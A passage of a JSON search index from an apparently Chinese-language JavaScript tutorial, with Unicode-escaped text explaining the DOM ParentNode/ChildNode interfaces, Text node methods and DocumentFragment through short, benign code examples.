\u65b9\u6cd5\u4f7f\u7528\u53c2\u6570\u8282\u70b9\uff0c\u66ff\u6362\u5f53\u524d\u8282\u70b9\u3002\u53c2\u6570\u53ef\u4ee5\u662f\u5143\u7d20\u8282\u70b9\uff0c\u4e5f\u53ef\u4ee5\u662f\u6587\u672c\u8282\u70b9\u3002 1 2 var span = document . createElement ( 'span' ); el . replaceWith ( span ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c el \u8282\u70b9\u5c06\u88ab span \u8282\u70b9\u66ff\u6362\u3002","title":"ParentNode \u63a5\u53e3\uff0cChildNode \u63a5\u53e3"},{"location":"dom/parentnode/#parentnode-childnode","text":"\u8282\u70b9\u5bf9\u8c61\u9664\u4e86\u7ee7\u627f Node \u63a5\u53e3\u4ee5\u5916\uff0c\u8fd8\u62e5\u6709\u5176\u4ed6\u63a5\u53e3\u3002 ParentNode \u63a5\u53e3\u8868\u793a\u5f53\u524d\u8282\u70b9\u662f\u4e00\u4e2a\u7236\u8282\u70b9\uff0c\u63d0\u4f9b\u4e00\u4e9b\u5904\u7406\u5b50\u8282\u70b9\u7684\u65b9\u6cd5\u3002 ChildNode \u63a5\u53e3\u8868\u793a\u5f53\u524d\u8282\u70b9\u662f\u4e00\u4e2a\u5b50\u8282\u70b9\uff0c\u63d0\u4f9b\u4e00\u4e9b\u76f8\u5173\u65b9\u6cd5\u3002","title":"ParentNode \u63a5\u53e3\uff0cChildNode \u63a5\u53e3"},{"location":"dom/parentnode/#parentnode","text":"\u5982\u679c\u5f53\u524d\u8282\u70b9\u662f\u7236\u8282\u70b9\uff0c\u5c31\u4f1a\u6df7\u5165\u4e86\uff08mixin\uff09 ParentNode \u63a5\u53e3\u3002\u7531\u4e8e\u53ea\u6709\u5143\u7d20\u8282\u70b9\uff08element\uff09\u3001\u6587\u6863\u8282\u70b9\uff08document\uff09\u548c\u6587\u6863\u7247\u6bb5\u8282\u70b9\uff08documentFragment\uff09\u62e5\u6709\u5b50\u8282\u70b9\uff0c\u56e0\u6b64\u53ea\u6709\u8fd9\u4e09\u7c7b\u8282\u70b9\u4f1a\u62e5\u6709 ParentNode \u63a5\u53e3\u3002","title":"ParentNode \u63a5\u53e3"},{"location":"dom/parentnode/#parentnodechildren","text":"children \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5143\u7d20\u5b50\u8282\u70b9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 \u4e0b\u9762\u662f\u904d\u5386\u67d0\u4e2a\u8282\u70b9\u7684\u6240\u6709\u5143\u7d20\u5b50\u8282\u70b9\u7684\u793a\u4f8b\u3002 1 2 3 for ( var i = 0 ; i < el . children . length ; i ++ ) { // ... } \u6ce8\u610f\uff0c children \u5c5e\u6027\u53ea\u5305\u62ec\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u4e0d\u5305\u62ec\u5176\u4ed6\u7c7b\u578b\u7684\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u6587\u672c\u5b50\u8282\u70b9\uff09\u3002\u5982\u679c\u6ca1\u6709\u5143\u7d20\u7c7b\u578b\u7684\u5b50\u8282\u70b9\uff0c\u8fd4\u56de\u503c HTMLCollection \u5b9e\u4f8b\u7684 length \u5c5e\u6027\u4e3a 0 \u3002 \u53e6\u5916\uff0c HTMLCollection \u662f\u52a8\u6001\u96c6\u5408\uff0c\u4f1a\u5b9e\u65f6\u53cd\u6620 DOM \u7684\u4efb\u4f55\u53d8\u5316\u3002","title":"ParentNode.children"},{"location":"dom/parentnode/#parentnodefirstelementchild","text":"firstElementChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u3002\u5982\u679c\u6ca1\u6709\u4efb\u4f55\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 document . firstElementChild . nodeName // \"HTML\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document \u8282\u70b9\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u662f <HTML> \u3002","title":"ParentNode.firstElementChild"},{"location":"dom/parentnode/#parentnodelastelementchild","text":"lastElementChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u4efb\u4f55\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 document . lastElementChild . nodeName // \"HTML\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c document \u8282\u70b9\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u662f <HTML> \uff08\u56e0\u4e3a document \u53ea\u5305\u542b\u8fd9\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\uff09\u3002","title":"ParentNode.lastElementChild"},{"location":"dom/parentnode/#parentnodechildelementcount","text":"childElementCount \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5143\u7d20\u5b50\u8282\u70b9\u7684\u6570\u76ee\u3002\u5982\u679c\u4e0d\u5305\u542b\u4efb\u4f55\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u5219\u8fd4\u56de 0 \u3002 1 document . body . childElementCount // 13","title":"ParentNode.childElementCount"},{"location":"dom/parentnode/#parentnodeappendparentnodeprepend","text":"\uff081\uff09ParentNode.append() append() \u65b9\u6cd5\u4e3a\u5f53\u524d\u8282\u70b9\u8ffd\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5b50\u8282\u70b9\uff0c\u4f4d\u7f6e\u662f\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u7684\u540e\u9762\u3002 \u8be5\u65b9\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u6dfb\u52a0\u5143\u7d20\u5b50\u8282\u70b9\uff08\u53c2\u6570\u4e3a\u5143\u7d20\u8282\u70b9\uff09\uff0c\u8fd8\u53ef\u4ee5\u6dfb\u52a0\u6587\u672c\u5b50\u8282\u70b9\uff08\u53c2\u6570\u4e3a\u5b57\u7b26\u4e32\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 var parent = document . body ; // \u6dfb\u52a0\u5143\u7d20\u5b50\u8282\u70b9 var p = document . createElement ( 'p' ); parent . append ( p ); // \u6dfb\u52a0\u6587\u672c\u5b50\u8282\u70b9 parent . append ( 'Hello' ); // \u6dfb\u52a0\u591a\u4e2a\u5143\u7d20\u5b50\u8282\u70b9 var p1 = document . createElement ( 'p' ); var p2 = document . createElement ( 'p' ); parent . append ( p1 , p2 ); // \u6dfb\u52a0\u5143\u7d20\u5b50\u8282\u70b9\u548c\u6587\u672c\u5b50\u8282\u70b9 var p = document . createElement ( 'p' ); parent . append ( 'Hello' , p ); \u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4e0e Node.prototype.appendChild() \u65b9\u6cd5\u6709\u4e09\u70b9\u4e0d\u540c\u3002 append() \u5141\u8bb8\u5b57\u7b26\u4e32\u4f5c\u4e3a\u53c2\u6570\uff0c appendChild() \u53ea\u5141\u8bb8\u5b50\u8282\u70b9\u4f5c\u4e3a\u53c2\u6570\u3002 append() \u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u800c appendChild() \u8fd4\u56de\u6dfb\u52a0\u7684\u5b50\u8282\u70b9\u3002 append() \u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u5b50\u8282\u70b9\u548c\u5b57\u7b26\u4e32\uff08\u5373\u5141\u8bb8\u591a\u4e2a\u53c2\u6570\uff09\uff0c appendChild() \u53ea\u80fd\u6dfb\u52a0\u4e00\u4e2a\u8282\u70b9\uff08\u5373\u53ea\u5141\u8bb8\u4e00\u4e2a\u53c2\u6570\uff09\u3002 \uff082\uff09ParentNode.prepend() prepend() \u65b9\u6cd5\u4e3a\u5f53\u524d\u8282\u70b9\u8ffd\u52a0\u4e00\u4e2a\u6216\u591a\u4e2a\u5b50\u8282\u70b9\uff0c\u4f4d\u7f6e\u662f\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u7684\u524d\u9762\u3002\u5b83\u7684\u7528\u6cd5\u4e0e append() \u65b9\u6cd5\u5b8c\u5168\u4e00\u81f4\uff0c\u4e5f\u662f\u6ca1\u6709\u8fd4\u56de\u503c\u3002","title":"ParentNode.append()\uff0cParentNode.prepend()"},{"location":"dom/parentnode/#childnode","text":"\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6709\u7236\u8282\u70b9\uff0c\u90a3\u4e48\u8be5\u8282\u70b9\u5c31\u62e5\u6709\u4e86 ChildNode \u63a5\u53e3\u3002","title":"ChildNode \u63a5\u53e3"},{"location":"dom/parentnode/#childnoderemove","text":"remove() \u65b9\u6cd5\u7528\u4e8e\u4ece\u7236\u8282\u70b9\u79fb\u9664\u5f53\u524d\u8282\u70b9\u3002 1 el . remove () \u4e0a\u9762\u4ee3\u7801\u5728 DOM \u91cc\u9762\u79fb\u9664\u4e86 el \u8282\u70b9\u3002","title":"ChildNode.remove()"},{"location":"dom/parentnode/#childnodebeforechildnodeafter","text":"\uff081\uff09ChildNode.before() before() \u65b9\u6cd5\u7528\u4e8e\u5728\u5f53\u524d\u8282\u70b9\u7684\u524d\u9762\uff0c\u63d2\u5165\u4e00\u4e2a\u6216\u591a\u4e2a\u540c\u7ea7\u8282\u70b9\u3002\u4e24\u8005\u62e5\u6709\u76f8\u540c\u7684\u7236\u8282\u70b9\u3002 \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u4e0d\u4ec5\u53ef\u4ee5\u63d2\u5165\u5143\u7d20\u8282\u70b9\uff0c\u8fd8\u53ef\u4ee5\u63d2\u5165\u6587\u672c\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var p = document . createElement ( 'p' ); var p1 = document . createElement ( 'p' ); // \u63d2\u5165\u5143\u7d20\u8282\u70b9 el . before ( p ); // \u63d2\u5165\u6587\u672c\u8282\u70b9 el . before ( 'Hello' ); // \u63d2\u5165\u591a\u4e2a\u5143\u7d20\u8282\u70b9 el . before ( p , p1 ); // \u63d2\u5165\u5143\u7d20\u8282\u70b9\u548c\u6587\u672c\u8282\u70b9 el . before ( p , 'Hello' ); \uff082\uff09ChildNode.after() after() \u65b9\u6cd5\u7528\u4e8e\u5728\u5f53\u524d\u8282\u70b9\u7684\u540e\u9762\uff0c\u63d2\u5165\u4e00\u4e2a\u6216\u591a\u4e2a\u540c\u7ea7\u8282\u70b9\uff0c\u4e24\u8005\u62e5\u6709\u76f8\u540c\u7684\u7236\u8282\u70b9\u3002\u7528\u6cd5\u4e0e before \u65b9\u6cd5\u5b8c\u5168\u76f8\u540c\u3002","title":"ChildNode.before()\uff0cChildNode.after()"},{"location":"dom/parentnode/#childnodereplacewith","text":"replaceWith() \u65b9\u6cd5\u4f7f\u7528\u53c2\u6570\u8282\u70b9\uff0c\u66ff\u6362\u5f53\u524d\u8282\u70b9\u3002\u53c2\u6570\u53ef\u4ee5\u662f\u5143\u7d20\u8282\u70b9\uff0c\u4e5f\u53ef\u4ee5\u662f\u6587\u672c\u8282\u70b9\u3002 1 2 var span = document . createElement ( 'span' ); el . replaceWith ( span ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c el \u8282\u70b9\u5c06\u88ab span \u8282\u70b9\u66ff\u6362\u3002","title":"ChildNode.replaceWith()"},{"location":"dom/text/","text":"Text \u8282\u70b9\u548c DocumentFragment \u8282\u70b9 \u00b6 Text \u8282\u70b9\u7684\u6982\u5ff5 \u00b6 \u6587\u672c\u8282\u70b9\uff08 Text \uff09\u4ee3\u8868\u5143\u7d20\u8282\u70b9\uff08 Element \uff09\u548c\u5c5e\u6027\u8282\u70b9\uff08 Attribute \uff09\u7684\u6587\u672c\u5185\u5bb9\u3002\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u53ea\u5305\u542b\u4e00\u6bb5\u6587\u672c\uff0c\u90a3\u4e48\u5b83\u5c31\u6709\u4e00\u4e2a\u6587\u672c\u5b50\u8282\u70b9\uff0c\u4ee3\u8868\u8be5\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002 \u901a\u5e38\u6211\u4eec\u4f7f\u7528\u7236\u8282\u70b9\u7684 firstChild \u3001 nextSibling \u7b49\u5c5e\u6027\u83b7\u53d6\u6587\u672c\u8282\u70b9\uff0c\u6216\u8005\u4f7f\u7528 Document \u8282\u70b9\u7684 createTextNode \u65b9\u6cd5\u521b\u9020\u4e00\u4e2a\u6587\u672c\u8282\u70b9\u3002 1 2 3 4 5 6 // \u83b7\u53d6\u6587\u672c\u8282\u70b9 var textNode = document . querySelector ( 'p' ). firstChild ; // \u521b\u9020\u6587\u672c\u8282\u70b9 var textNode = document . createTextNode ( 'Hi' ); document . querySelector ( 'div' ). appendChild ( textNode ); \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a Text \u6784\u9020\u51fd\u6570\u3002\u5b83\u8fd4\u56de\u4e00\u4e2a\u6587\u672c\u8282\u70b9\u5b9e\u4f8b\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f\u8be5\u6587\u672c\u8282\u70b9\u7684\u6587\u672c\u5185\u5bb9\u3002 1 2 3 4 5 // \u7a7a\u5b57\u7b26\u4e32 var text1 = new Text (); // \u975e\u7a7a\u5b57\u7b26\u4e32 var text2 = new Text ( 'This is a text node' ); \u6ce8\u610f\uff0c\u7531\u4e8e\u7a7a\u683c\u4e5f\u662f\u4e00\u4e2a\u5b57\u7b26\uff0c\u6240\u4ee5\u54ea\u6015\u53ea\u6709\u4e00\u4e2a\u7a7a\u683c\uff0c\u4e5f\u4f1a\u5f62\u6210\u6587\u672c\u8282\u70b9\u3002\u6bd4\u5982\uff0c <p> </p> \u5305\u542b\u4e00\u4e2a\u7a7a\u683c\uff0c\u5b83\u7684\u5b50\u8282\u70b9\u5c31\u662f\u4e00\u4e2a\u6587\u672c\u8282\u70b9\u3002 \u6587\u672c\u8282\u70b9\u9664\u4e86\u7ee7\u627f Node \u63a5\u53e3\uff0c\u8fd8\u7ee7\u627f\u4e86 CharacterData \u63a5\u53e3\u3002 Node \u63a5\u53e3\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u8bf7\u53c2\u8003\u300aNode \u63a5\u53e3\u300b\u4e00\u7ae0\uff0c\u8fd9\u91cc\u4e0d\u518d\u91cd\u590d\u4ecb\u7ecd\u4e86\uff0c\u4ee5\u4e0b\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u5927\u90e8\u5206\u6765\u81ea CharacterData \u63a5\u53e3\u3002 Text \u8282\u70b9\u7684\u5c5e\u6027 \u00b6 data \u00b6 data \u5c5e\u6027\u7b49\u540c\u4e8e nodeValue \u5c5e\u6027\uff0c\u7528\u6765\u8bbe\u7f6e\u6216\u8bfb\u53d6\u6587\u672c\u8282\u70b9\u7684\u5185\u5bb9\u3002 1 2 3 4 5 6 7 // \u8bfb\u53d6\u6587\u672c\u5185\u5bb9 document . querySelector ( 'p' ). firstChild . data // \u7b49\u540c\u4e8e document . querySelector ( 'p' ). firstChild . nodeValue // \u8bbe\u7f6e\u6587\u672c\u5185\u5bb9 document . querySelector ( 'p' ). firstChild . data = 'Hello World' ; wholeText \u00b6 wholeText \u5c5e\u6027\u5c06\u5f53\u524d\u6587\u672c\u8282\u70b9\u4e0e\u6bd7\u90bb\u7684\u6587\u672c\u8282\u70b9\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u6574\u4f53\u8fd4\u56de\u3002\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c wholeText \u5c5e\u6027\u7684\u8fd4\u56de\u503c\uff0c\u4e0e data \u5c5e\u6027\u548c textContent \u5c5e\u6027\u76f8\u540c\u3002\u4f46\u662f\uff0c\u67d0\u4e9b\u7279\u6b8a\u60c5\u51b5\u4f1a\u6709\u5dee\u5f02\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0cHTML \u4ee3\u7801\u5982\u4e0b\u3002 1 < p id = \"para\" > A < em > B </ em > C </ p > \u8fd9\u65f6\uff0c\u6587\u672c\u8282\u70b9\u7684 wholeText \u5c5e\u6027\u548c data \u5c5e\u6027\uff0c\u8fd4\u56de\u503c\u76f8\u540c\u3002 1 2 3 var el = document . getElementById ( 'para' ); el . firstChild . wholeText // \"A \" el . firstChild . data // \"A \" \u4f46\u662f\uff0c\u4e00\u65e6\u79fb\u9664 <em> \u8282\u70b9\uff0c wholeText \u5c5e\u6027\u4e0e data \u5c5e\u6027\u5c31\u4f1a\u6709\u5dee\u5f02\uff0c\u56e0\u4e3a\u8fd9\u65f6\u5176\u5b9e <p> \u8282\u70b9\u4e0b\u9762\u5305\u542b\u4e86\u4e24\u4e2a\u6bd7\u90bb\u7684\u6587\u672c\u8282\u70b9\u3002 1 2 3 el . removeChild ( para . childNodes [ 1 ]); el . firstChild . wholeText // \"A C\" el . firstChild . data // \"A \" length \u00b6 length \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u672c\u8282\u70b9\u7684\u6587\u672c\u957f\u5ea6\u3002 1 ( new Text ( 'Hello' )). length // 5 nextElementSibling\uff0cpreviousElementSibling \u00b6 nextElementSibling \u5c5e\u6027\u8fd4\u56de\u7d27\u8ddf\u5728\u5f53\u524d\u6587\u672c\u8282\u70b9\u540e\u9762\u7684\u90a3\u4e2a\u540c\u7ea7\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u53d6\u4e0d\u5230\u5143\u7d20\u8282\u70b9\uff0c\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 // HTML \u4e3a // <div>Hello <em>World</em></div> var tn = document . querySelector ( 'div' ). firstChild ; tn . nextElementSibling // <em>World</em> previousElementSibling \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u6587\u672c\u8282\u70b9\u524d\u9762\u6700\u8fd1\u7684\u540c\u7ea7\u5143\u7d20\u8282\u70b9\u3002\u5982\u679c\u53d6\u4e0d\u5230\u5143\u7d20\u8282\u70b9\uff0c\u5219\u8fd4\u56de null\uff1a \u3002 Text \u8282\u70b9\u7684\u65b9\u6cd5 \u00b6 appendData()\uff0cdeleteData()\uff0cinsertData()\uff0creplaceData()\uff0csubStringData() \u00b6 \u4ee5\u4e0b5\u4e2a\u65b9\u6cd5\u90fd\u662f\u7f16\u8f91 Text \u8282\u70b9\u6587\u672c\u5185\u5bb9\u7684\u65b9\u6cd5\u3002 appendData() \uff1a\u5728 Text \u8282\u70b9\u5c3e\u90e8\u8ffd\u52a0\u5b57\u7b26\u4e32\u3002 deleteData() \uff1a\u5220\u9664 Text \u8282\u70b9\u5185\u90e8\u7684\u5b50\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5b50\u5b57\u7b26\u4e32\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u5b50\u5b57\u7b26\u4e32\u957f\u5ea6\u3002 insertData() \uff1a\u5728 Text \u8282\u70b9\u63d2\u5165\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u63d2\u5165\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u63d2\u5165\u7684\u5b50\u5b57\u7b26\u4e32\u3002 replaceData() \uff1a\u7528\u4e8e\u66ff\u6362\u6587\u672c\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u66ff\u6362\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u9700\u8981\u88ab\u66ff\u6362\u6389\u7684\u957f\u5ea6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u4e3a\u65b0\u52a0\u5165\u7684\u5b57\u7b26\u4e32\u3002 subStringData() \uff1a\u7528\u4e8e\u83b7\u53d6\u5b50\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u5b50\u5b57\u7b26\u4e32\u5728 Text \u8282\u70b9\u4e2d\u7684\u5f00\u59cb\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a\u5b50\u5b57\u7b26\u4e32\u957f\u5ea6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // HTML \u4ee3\u7801\u4e3a // <p>Hello World</p> var pElementText = document . querySelector ( 'p' ). firstChild ; pElementText . appendData ( '!' ); // \u9875\u9762\u663e\u793a Hello World! pElementText . deleteData ( 7 , 5 ); // \u9875\u9762\u663e\u793a Hello W pElementText . insertData ( 7 , 'Hello ' ); // \u9875\u9762\u663e\u793a Hello WHello pElementText . replaceData ( 7 , 5 , 'World' ); // \u9875\u9762\u663e\u793a Hello WWorld pElementText . substringData ( 7 , 10 ); // \u9875\u9762\u663e\u793a\u4e0d\u53d8\uff0c\u8fd4\u56de\"World \" remove() \u00b6 remove \u65b9\u6cd5\u7528\u4e8e\u79fb\u9664\u5f53\u524d Text \u8282\u70b9\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <p>Hello World</p> document . querySelector ( 'p' ). firstChild . remove () // \u73b0\u5728 HTML \u4ee3\u7801\u4e3a // <p></p> splitText() \u00b6 splitText \u65b9\u6cd5\u5c06 Text \u8282\u70b9\u4e00\u5206\u4e3a\u4e8c\uff0c\u53d8\u6210\u4e24\u4e2a\u6bd7\u90bb\u7684 Text \u8282\u70b9\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f\u5206\u5272\u4f4d\u7f6e\uff08\u4ece\u96f6\u5f00\u59cb\uff09\uff0c\u5206\u5272\u5230\u8be5\u4f4d\u7f6e\u7684\u5b57\u7b26\u524d\u7ed3\u675f\u3002\u5982\u679c\u5206\u5272\u4f4d\u7f6e\u4e0d\u5b58\u5728\uff0c\u5c06\u62a5\u9519\u3002 \u5206\u5272\u540e\uff0c\u8be5\u65b9\u6cd5\u8fd4\u56de\u5206\u5272\u4f4d\u7f6e\u540e\u65b9\u7684\u5b57\u7b26\u4e32\uff0c\u800c\u539f Text \u8282\u70b9\u53d8\u6210\u53ea\u5305\u542b\u5206\u5272\u4f4d\u7f6e\u524d\u65b9\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 // html \u4ee3\u7801\u4e3a <p id=\"p\">foobar</p> var p = document . getElementById ( 'p' ); var textnode = p . firstChild ; var newText = textnode . splitText ( 3 ); newText // \"bar\" textnode // \"foo\" \u7236\u5143\u7d20\u8282\u70b9\u7684 normalize \u65b9\u6cd5\u53ef\u4ee5\u5c06\u6bd7\u90bb\u7684\u4e24\u4e2a Text \u8282\u70b9\u5408\u5e76\u3002 \u63a5\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u6587\u672c\u8282\u70b9\u7684 splitText \u65b9\u6cd5\u5c06\u4e00\u4e2a Text \u8282\u70b9\u5206\u5272\u6210\u4e24\u4e2a\uff0c\u7236\u5143\u7d20\u7684 normalize \u65b9\u6cd5\u53ef\u4ee5\u5b9e\u73b0\u9006\u64cd\u4f5c\uff0c\u5c06\u5b83\u4eec\u5408\u5e76\u3002 1 2 3 4 5 p . childNodes . length // 2 // \u5c06\u6bd7\u90bb\u7684\u4e24\u4e2a Text \u8282\u70b9\u5408\u5e76 p . normalize (); p . childNodes . length // 1 DocumentFragment \u8282\u70b9 \u00b6 DocumentFragment \u8282\u70b9\u4ee3\u8868\u4e00\u4e2a\u6587\u6863\u7684\u7247\u6bb5\uff0c\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5b8c\u6574\u7684 DOM \u6811\u5f62\u7ed3\u6784\u3002\u5b83\u6ca1\u6709\u7236\u8282\u70b9\uff0c parentNode \u8fd4\u56de null \uff0c\u4f46\u662f\u53ef\u4ee5\u63d2\u5165\u4efb\u610f\u6570\u91cf\u7684\u5b50\u8282\u70b9\u3002\u5b83\u4e0d\u5c5e\u4e8e\u5f53\u524d\u6587\u6863\uff0c\u64cd\u4f5c DocumentFragment \u8282\u70b9\uff0c\u8981\u6bd4\u76f4\u63a5\u64cd\u4f5c DOM \u6811\u5feb\u5f97\u591a\u3002 \u5b83\u4e00\u822c\u7528\u4e8e\u6784\u5efa\u4e00\u4e2a DOM \u7ed3\u6784\uff0c\u7136\u540e\u63d2\u5165\u5f53\u524d\u6587\u6863\u3002 document.createDocumentFragment \u65b9\u6cd5\uff0c\u4ee5\u53ca\u6d4f\u89c8\u5668\u539f\u751f\u7684 DocumentFragment \u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7a7a\u7684 DocumentFragment \u8282\u70b9\u3002\u7136\u540e\u518d\u4f7f\u7528\u5176\u4ed6 DOM \u65b9\u6cd5\uff0c\u5411\u5176\u6dfb\u52a0\u5b50\u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 var docFrag = document . createDocumentFragment (); // \u7b49\u540c\u4e8e var docFrag = new DocumentFragment (); var li = document . createElement ( 'li' ); li . textContent = 'Hello World' ; docFrag . appendChild ( li ); document . querySelector ( 'ul' ). appendChild ( docFrag ); \u4e0a\u9762\u4ee3\u7801\u521b\u5efa\u4e86\u4e00\u4e2a DocumentFragment \u8282\u70b9\uff0c\u7136\u540e\u5c06\u4e00\u4e2a li \u8282\u70b9\u6dfb\u52a0\u5728\u5b83\u91cc\u9762\uff0c\u6700\u540e\u5c06 DocumentFragment \u8282\u70b9\u79fb\u52a8\u5230\u539f\u6587\u6863\u3002 \u6ce8\u610f\uff0c DocumentFragment \u8282\u70b9\u672c\u8eab\u4e0d\u80fd\u88ab\u63d2\u5165\u5f53\u524d\u6587\u6863\u3002\u5f53\u5b83\u4f5c\u4e3a appendChild() \u3001 insertBefore() \u3001 replaceChild() \u7b49\u65b9\u6cd5\u7684\u53c2\u6570\u65f6\uff0c\u662f\u5b83\u7684\u6240\u6709\u5b50\u8282\u70b9\u63d2\u5165\u5f53\u524d\u6587\u6863\uff0c\u800c\u4e0d\u662f\u5b83\u81ea\u8eab\u3002\u4e00\u65e6 DocumentFragment \u8282\u70b9\u88ab\u6dfb\u52a0\u8fdb\u5f53\u524d\u6587\u6863\uff0c\u5b83\u81ea\u8eab\u5c31\u53d8\u6210\u4e86\u7a7a\u8282\u70b9\uff08 textContent \u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff09\uff0c\u53ef\u4ee5\u88ab\u518d\u6b21\u4f7f\u7528\u3002\u5982\u679c\u60f3\u8981\u4fdd\u5b58 DocumentFragment \u8282\u70b9\u7684\u5185\u5bb9\uff0c\u53ef\u4ee5\u4f7f\u7528 cloneNode \u65b9\u6cd5\u3002 1 2 3 document . querySelector ( 'ul' ) . appendChild ( docFrag . cloneNode ( true )); \u4e0a\u9762\u8fd9\u6837\u6dfb\u52a0 DocumentFragment \u8282\u70b9\u8fdb\u5165\u5f53\u524d\u6587\u6863\uff0c\u4e0d\u4f1a\u6e05\u7a7a DocumentFragment \u8282\u70b9\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4f7f\u7528 DocumentFragment \u53cd\u8f6c\u4e00\u4e2a\u6307\u5b9a\u8282\u70b9\u7684\u6240\u6709\u5b50\u8282\u70b9\u7684\u987a\u5e8f\u3002 1 2 3 4 5 function reverse ( n ) { var f = document . createDocumentFragment (); while ( n . lastChild ) f . appendChild ( n . lastChild ); n . appendChild ( f ); } DocumentFragment \u8282\u70b9\u5bf9\u8c61\u6ca1\u6709\u81ea\u5df1\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5168\u90e8\u7ee7\u627f\u81ea Node \u8282\u70b9\u548c ParentNode \u63a5\u53e3\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c DocumentFragment \u8282\u70b9\u6bd4 Node \u8282\u70b9\u591a\u51fa\u4ee5\u4e0b\u56db\u4e2a\u5c5e\u6027\u3002 children \uff1a\u8fd4\u56de\u4e00\u4e2a\u52a8\u6001\u7684 HTMLCollection \u96c6\u5408\u5bf9\u8c61\uff0c\u5305\u62ec\u5f53\u524d DocumentFragment \u5bf9\u8c61\u7684\u6240\u6709\u5b50\u5143\u7d20\u8282\u70b9\u3002 firstElementChild \uff1a\u8fd4\u56de\u5f53\u524d DocumentFragment \u5bf9\u8c61\u7684\u7b2c\u4e00\u4e2a\u5b50\u5143\u7d20\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 lastElementChild \uff1a\u8fd4\u56de\u5f53\u524d DocumentFragment \u5bf9\u8c61\u7684\u6700\u540e\u4e00\u4e2a\u5b50\u5143\u7d20\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 childElementCount \uff1a\u8fd4\u56de\u5f53\u524d DocumentFragment \u5bf9\u8c61\u7684\u6240\u6709\u5b50\u5143\u7d20\u6570\u91cf\u3002","title":"Text \u8282\u70b9\u548c DocumentFragment \u8282\u70b9"},{"location":"dom/text/#text-documentfragment","text":"","title":"Text \u8282\u70b9\u548c DocumentFragment 